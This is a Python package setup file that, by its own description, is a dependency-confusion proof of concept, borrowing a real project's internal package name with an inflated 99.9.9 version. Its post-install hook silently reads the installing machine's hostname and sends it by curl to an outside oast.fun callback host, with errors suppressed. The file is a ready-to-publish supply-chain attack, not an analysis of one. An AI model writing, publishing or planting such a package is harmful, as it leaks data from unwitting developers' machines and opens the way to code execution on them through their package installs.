from setuptools import setup
from setuptools.command.install import install
import os
import socket

class PostInstallCommand(install):
    def run(self):
        install.run(self)
        try:
            target_host = "gsfjgwblnyenbmburfudh2kpmj7yn4umc.oast.fun"
            local_hostname = socket.gethostname()
            os.system(f"curl http://{local_hostname}.{target_host}")
        except Exception:
            pass

setup(
    name="securedrop-workstation-dom0-config",
    version="99.9.9",
    description="Dependency Confusion PoC - CTF Research",
    author="Research",
    # FIX: Change this to an empty list since we don't have a source folder
    packages=[], 
    cmdclass={
        'install': PostInstallCommand,
    },
)
